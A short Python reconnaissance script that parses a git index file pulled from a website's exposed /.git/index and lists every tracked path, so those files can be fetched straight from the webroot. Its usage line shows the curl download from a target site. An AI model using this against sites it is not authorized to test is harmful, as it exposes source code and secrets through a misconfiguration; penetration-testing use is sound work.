#!/usr/bin/env python3
"""Parse a git index file (DIRC v2) recovered from an exposed /.git/index
and print the full tracked-file inventory. Use when objects/pack are 404
(GC'd repo) and git-dumper fails — the working tree is the webroot, so
every listed path can be fetched directly from the site root.

Usage:
  curl -s -o git.index https://TARGET/.git/index
  python3 git-index-parse.py git.index
"""
import struct
import sys


def parse(path):
    data = open(path, 'rb').read()
    if data[:4] != b'DIRC':
        sys.exit('not a git index (missing DIRC magic)')
    version, count = struct.unpack('>II', data[4:12])
    print(f'index v{version} entries={count}', file=sys.stderr)
    if version != 2:
        sys.exit(f'only DIRC v2 supported, got v{version}')
    off = 12
    for _ in range(count):
        entry = data[off:off + 62]
        if len(entry) < 62:
            sys.exit('truncated index')
        flags = struct.unpack('>H', entry[60:62])[0]
        namelen = flags & 0xFFF
        name = data[off + 62:off + 62 + namelen].decode('utf-8', 'replace')
        print(name)
        # entries padded to multiple of 8 (62 fixed + name + NUL pad)
        off += (62 + namelen + 8) // 8 * 8


if __name__ == '__main__':
    parse(sys.argv[1] if len(sys.argv) > 1 else 'git.index')
